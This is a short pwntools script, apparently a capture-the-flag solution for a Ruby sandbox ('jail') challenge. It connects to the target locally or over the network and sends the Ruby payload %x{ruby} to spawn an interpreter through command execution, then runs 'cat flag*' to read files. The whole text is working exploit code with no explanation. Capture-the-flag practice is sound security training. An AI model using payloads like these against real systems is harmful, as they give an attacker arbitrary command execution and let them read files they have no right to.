from pwn import *
if args.LOCAL:
    io = process(['./jail.rb'])
else:
    io = remote(args.HOST, args.PORT)

io.sendline(b"%x{ruby}")
sleep(1)
io.sendline(b"puts %x{cat flag*}")
io.shutdown("send")
io.stream()
